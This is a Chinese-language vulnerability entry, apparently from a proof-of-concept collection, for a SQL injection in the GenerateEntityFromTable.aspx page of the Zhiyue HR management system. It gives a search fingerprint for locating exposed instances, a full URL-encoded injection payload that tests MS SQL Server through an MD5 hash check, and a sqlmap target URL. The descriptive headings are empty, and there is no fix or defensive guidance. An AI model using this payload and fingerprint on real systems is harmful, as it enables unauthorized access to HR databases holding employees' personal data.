# 智跃人力资源管理系统GenerateEntityFromTable.aspxSQL注入漏洞

- **系统**：智跃人力资源管理系统GenerateEntityFromTable.aspx　|　**类型**：SQL注入　|　**CVE**：—
- **指纹**：`web.body="ZY.LOGO.64.png"`

**请求体 / payload**
```
/resource/utils/GenerateEntityFromTable.aspx?t=1%27%2B(SELECT%20CHAR(103)%2BCHAR(87)%2BCHAR(114)%2BCHAR(112)%20WHERE%201669%3D1669%20AND%206492%20IN%20(select%20SUBSTRING(sys.fn_sqlvarbasetostr(HASHBYTES(%27MD5%27,%271230%27)),3,32)))%2B%27

sqlmap
/resource/utils/GenerateEntityFromTable.aspx?t=1
```

**其他**
- 智跃人力资源管理系统 GenerateEntityFromTable.aspx SQL注入漏洞: * 一、漏洞简介
* 二、影响版本
* 三、资产测绘
* 四、漏洞复现
***
- 版本: * 智跃人力资源管理系统